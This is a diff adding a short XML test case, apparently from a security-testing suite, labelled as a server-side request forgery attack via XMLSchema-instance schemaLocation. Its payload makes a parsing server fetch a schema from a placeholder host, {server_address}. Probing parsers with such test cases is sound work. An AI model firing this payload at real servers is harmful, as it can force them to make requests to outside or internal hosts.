@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--;testcase
+[General]
+name: SchemaLocation URL Invocation
+description: Server Side Request Forgery Attack via XMLSchema-instance SchemaLocation
+-->
+<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ttt="http://example.com/attack" xsi:schemaLocation="ttt http://{server_address}/ssrf-schemalocation.xsd">4</ttt:data>
